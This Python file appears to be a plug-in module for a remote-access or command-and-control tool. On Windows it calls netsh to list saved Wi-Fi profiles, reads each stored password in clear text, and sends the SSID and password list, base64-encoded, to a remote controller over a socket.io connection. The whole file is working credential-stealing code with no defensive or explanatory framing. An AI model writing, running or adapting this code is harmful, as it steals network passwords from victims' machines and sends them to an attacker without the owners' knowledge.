import os
import subprocess
import re
import base64

def run(sio, uuid):
    if os.name == "nt":

        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

        wifi_list = []


        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}

                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()

                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)

                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile)

        for x in range(len(wifi_list)):
            print(wifi_list[x])

        sio.emit('download_file_return', {'uuid': uuid, 'file_name': "wifi-passwords.txt", 'file': base64.b64encode(str(wifi_list).encode('utf-8'))})